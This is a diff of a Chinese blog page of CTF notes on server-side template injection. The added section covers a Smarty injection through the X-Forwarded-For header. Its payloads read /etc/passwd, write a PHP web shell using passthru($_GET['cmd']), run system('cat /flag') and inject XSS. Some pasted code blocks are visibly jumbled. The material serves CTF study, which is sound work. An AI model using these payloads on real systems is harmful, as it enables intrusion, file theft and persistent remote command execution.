@@ -33,7 +33,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/20230226102815-3922049c-b57d-1.png">
 <meta property="article:published_time" content="2025-03-01T06:31:35.000Z">
-<meta property="article:modified_time" content="2025-03-04T08:34:26.000Z">
+<meta property="article:modified_time" content="2025-03-04T13:34:28.120Z">
 <meta property="article:author" content="温柔刀">
 <meta property="article:tag" content="笔记">
 <meta property="article:tag" content="SSTI">
@@ -121,7 +121,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-web361"><span class="nav-number">1.</span> <span class="nav-text">ctfshow web361</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97-web362"><span class="nav-number">2.</span> <span class="nav-text">过滤数字 web362</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">数字型绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%85%B6%E4%BB%96%E7%9A%84%E7%B1%BB"><span class="nav-number">2.2.</span> <span class="nav-text">用其他的类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen"><span class="nav-number">2.2.1.</span> <span class="nav-text">subprocess.Popen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frozen-importlib-external-FileLoader"><span class="nav-number">2.2.2.</span> <span class="nav-text">_frozen_importlib_external.FileLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lipsum%EF%BC%88flask%EF%BC%89"><span class="nav-number">2.2.3.</span> <span class="nav-text">lipsum（flask）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins"><span class="nav-number">2.2.4.</span> <span class="nav-text">builtins</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7-web363"><span class="nav-number">3.</span> <span class="nav-text">过滤单双引号 web363</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7-args-web364"><span class="nav-number">4.</span> <span class="nav-text">过滤引号+args web364</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-web365"><span class="nav-number">5.</span> <span class="nav-text">过滤[] web365</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="nav-number">6.</span> <span class="nav-text">[GWCTF 2019]你的名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NISACTF-2022-midlevel"><span class="nav-number">7.</span> <span class="nav-text">[NISACTF 2022]midlevel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Smarty%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%EF%BC%9A"><span class="nav-number">7.1.</span> <span class="nav-text">Smarty漏洞成因：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">7.1.1.</span> <span class="nav-text">SSTI 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-SERVER-HTTP-X-FORWARDED-FOR-%E5%8F%AF%E6%8E%A7"><span class="nav-number">7.1.1.1.</span> <span class="nav-text">1. $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 可控</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-web361"><span class="nav-number">1.</span> <span class="nav-text">ctfshow web361</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97-web362"><span class="nav-number">2.</span> <span class="nav-text">过滤数字 web362</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">数字型绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E5%85%B6%E4%BB%96%E7%9A%84%E7%B1%BB"><span class="nav-number">2.2.</span> <span class="nav-text">用其他的类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-Popen"><span class="nav-number">2.2.1.</span> <span class="nav-text">subprocess.Popen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frozen-importlib-external-FileLoader"><span class="nav-number">2.2.2.</span> <span class="nav-text">_frozen_importlib_external.FileLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lipsum%EF%BC%88flask%EF%BC%89"><span class="nav-number">2.2.3.</span> <span class="nav-text">lipsum（flask）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins"><span class="nav-number">2.2.4.</span> <span class="nav-text">builtins</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7-web363"><span class="nav-number">3.</span> <span class="nav-text">过滤单双引号 web363</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7-args-web364"><span class="nav-number">4.</span> <span class="nav-text">过滤引号+args web364</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-web365"><span class="nav-number">5.</span> <span class="nav-text">过滤[] web365</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97"><span class="nav-number">6.</span> <span class="nav-text">[GWCTF 2019]你的名字</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NISACTF-2022-midlevel"><span class="nav-number">7.</span> <span class="nav-text">[NISACTF 2022]midlevel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-ds"><span class="nav-number">7.0.1.</span> <span class="nav-text">SSTI 漏洞分析(ds)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-SERVER-HTTP-X-FORWARDED-FOR-%E5%8F%AF%E6%8E%A7"><span class="nav-number">7.0.1.1.</span> <span class="nav-text">1. $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 可控</span></a></li></ol></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -136,13 +136,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -216,7 +216,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-04 16:34:26" itemprop="dateModified" datetime="2025-03-04T16:34:26+08:00">2025-03-04</time>
+      <time title="修改时间：2025-03-04 21:34:28" itemprop="dateModified" datetime="2025-03-04T21:34:28+08:00">2025-03-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -249,14 +249,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>999</span>
+      <span>1.9k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>7 分钟</span>
     </span>
 </div>
 
@@ -334,12 +334,15 @@
 <p><a target="_blank" rel="noopener" href="https://drinkflower.asia/wordpress/archives/441">严格过滤下的SSTI注入</a></p>
 <h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><h1 id="NISACTF-2022-midlevel"><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1><img src="/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/20230226102815-3922049c-b57d-1.png" class="" title="20230226102815-3922049c-b57d-1">
 
-<h2 id="Smarty漏洞成因："><a href="#Smarty漏洞成因：" class="headerlink" title="Smarty漏洞成因："></a>Smarty漏洞成因：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Smarty漏洞成因：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这段 PHP 代码的关键漏洞点在于 <strong>SSTI（服务器端模板注入）</strong>，主要问题出现在这一行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">$smarty-&gt;display(&quot;string:&quot;.$ip);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$smarty-&gt;display(&quot;string:&quot;.$ip);</span><br></pre></td></tr></table></figure>
 
-<h3 id="SSTI-漏洞分析"><a href="#SSTI-漏洞分析" class="headerlink" title="SSTI 漏洞分析"></a><strong>SSTI 漏洞分析</strong></h3><hr>
+<blockquote>
+<h3 id="SSTI-漏洞分析-ds"><a href="#SSTI-漏洞分析-ds" class="headerlink" title="SSTI 漏洞分析(ds)"></a><strong>SSTI 漏洞分析</strong>(ds)</h3><hr>
 <h4 id="1-SERVER-HTTP-X-FORWARDED-FOR-可控"><a href="#1-SERVER-HTTP-X-FORWARDED-FOR-可控" class="headerlink" title="1. $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 可控"></a><strong>1. <code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code> 可控</strong></h4><ul>
 <li><pre><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">是 HTTP 请求头字段，攻击者可以通过伪造请求头来控制其值，比如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -380,12 +383,37 @@ scss
 
 复制编辑
 X-Forwarded-For: &#123;phpinfo()&#125;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  如果 **PHP 允许 `Smarty` 解析 `php` 标签**，就会执行 `phpinfo()`，泄露 PHP 配置信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">{% asset_img "QQ20250304-170345.png" "QQ20250304-170345" %}</span><br><span class="line"></span><br><span class="line">## smarty模板操作手册</span><br><span class="line"></span><br><span class="line">从这里开始就有点难懂</span><br><span class="line"></span><br><span class="line">大白话理解版本：</span><br><span class="line"></span><br><span class="line">当你通过分支图确定是smarty模板</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </code></pre>
-<p>如果 <strong>PHP 允许 <code>Smarty</code> 解析 <code>php</code> 标签</strong>，就会执行 <code>phpinfo()</code>，泄露 PHP 配置信息。</p>
 </li>
 </ul>
-<p>这个地方对应的就是xff头处存在smarty模板，我们可以利用smarty形式来进行攻击。</p>
-<p>摘自：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11666?time__1311=eqUxuQDtDQitWkxBkFDnQFeG=2KiIxG8mKeD&u_atoken=d1877f7d5e5153ab62305384a28e30a9&u_asig=1a0c399a17410769091401613e00c7">Smarty模板注入&amp;CVE-2017-1000480</a></p>
+<p>a{<em>conmmet</em>b}</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">没有回显comment的值，就可以确定&#123;$smarty.version&#125;</span><br><span class="line"></span><br><span class="line">下面有1+3个可以选</span><br><span class="line"></span><br><span class="line"># 以下我都是直接复制过来没仔细看获取类的静态方法根本没看懂</span><br><span class="line"></span><br><span class="line">### 获取类的静态方法：</span><br><span class="line"></span><br><span class="line">$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后，我们就去找 smarty 给我们的方法:</span><br><span class="line"></span><br><span class="line">#### getStreamVariable():</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>public function getStreamVariable($variable)&#x2F;&#x2F;variable其实就是文件路径<br>{<br>        $_result &#x3D; ‘’;<br>        $fp &#x3D; fopen($variable, ‘r+’);&#x2F;&#x2F;从此处开始对文件进行读取<br>        if ($fp) {<br>            while (!feof($fp) &amp;&amp; ($current_line &#x3D; fgets($fp)) !&#x3D;&#x3D; false) {<br>                $_result .&#x3D; $current_line;<br>            }<br>            fclose($fp);<br>            return $_result;<br>        }<br>        $smarty &#x3D; isset($this-&gt;smarty) ? $this-&gt;smarty : $this;<br>        if ($smarty-&gt;error_unassigned) {<br>            throw new SmartyException(‘Undefined stream variable “‘ . $variable . ‘“‘);<br>        } else {<br>            return null;<br>        }<br>    }<br>&#x2F;&#x2F;可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法<br>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流<br>例如：<br>{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 不过这种利用方式只存在于旧版本中，而且在 3.1.30 的 Smarty 版本中官方已经将 `getStreamVariable` 静态方法删除。</span><br><span class="line"></span><br><span class="line">#### writeFile：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>public function writeFile($_filepath, $_contents, Smarty $smarty)<br>&#x2F;&#x2F;我们可以发现第三个参数$smarty其实就是一个smarty模板类型，要求是拒绝非Smarty类型的输入，这就意味着我们需要获取对Smarty对象的引用，然后我们在smarty中找到了 self::clearConfig()：<br>public function clearConfig($varname &#x3D; null)<br>{<br>    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);<br>}<br>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法<br>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,”<?php passthru($_GET['cmd']); ?>“,self::clearConfig())}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</span><br><span class="line"></span><br><span class="line">### `&#123;php&#125;&#123;/php&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{php}phpinfo();{&#x2F;php}  #执行相应的php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Smarty支持使用 &#123;php&#125;&#123;/php&#125; 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但因为在Smarty3版本中已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br><span class="line"></span><br><span class="line">### `&#123;literal&#125;`</span><br><span class="line"></span><br><span class="line">- &#123;literal&#125; 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</span><br><span class="line">- 在 PHP5 环境下存在一种 PHP 标签， `&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，`我们便可以利用这一标签进行任意的 PHP 代码执行。</span><br><span class="line">- 通过上述描述也可以想到，我们完全可以利用这一种标签来实现 XSS 攻击，这一种攻击方式在 SSTI 中也是很常见的，因为基本上所有模板都会因为需要提供类似的功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{literal}alert(‘xss’);{&#x2F;literal}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `&#123;if&#125;&#123;/if&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if phpinfo()}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Smarty的 &#123;if&#125; 条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如`||`，`or`，`&amp;&amp;`，`and`，`is_array()`等等，如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if is_array($array)}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">还可以用来执行命令：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if phpinfo()}{&#x2F;if}<br>{if readfile (‘&#x2F;flag’)}{&#x2F;if}<br>{if show_source(‘&#x2F;flag’)}{&#x2F;if}<br>{if system(‘cat &#x2F;flag’)}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这道题的版本为3.1.30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F;所以这个位置我们不能够使用获取类的静态方法来进行攻击，也不能用php标签来进行攻击。<br>&#x2F;&#x2F;又因为php的版本是php7，所以我们不能用literal标签，最后我们使用if来进行攻击</p>
+<pre><code>
+
+
+
+
+
+
+参考：[Smarty模板注入&amp;CVE-2017-1000480](https://xz.aliyun.com/news/11666?time__1311=eqUxuQDtDQitWkxBkFDnQFeG%3D2KiIxG8mKeD&amp;u_atoken=d1877f7d5e5153ab62305384a28e30a9&amp;u_asig=1a0c399a17410769091401613e00c7)
+</code></pre>
 
     </div>
 
@@ -448,14 +476,14 @@ X-Forwarded-For: &#123;phpinfo()&#125;
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">14k</span>
+    <span title="站点总字数">15k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">51 分钟</span>
+    <span title="站点阅读时长">55 分钟</span>
   </span>
 </div>
 
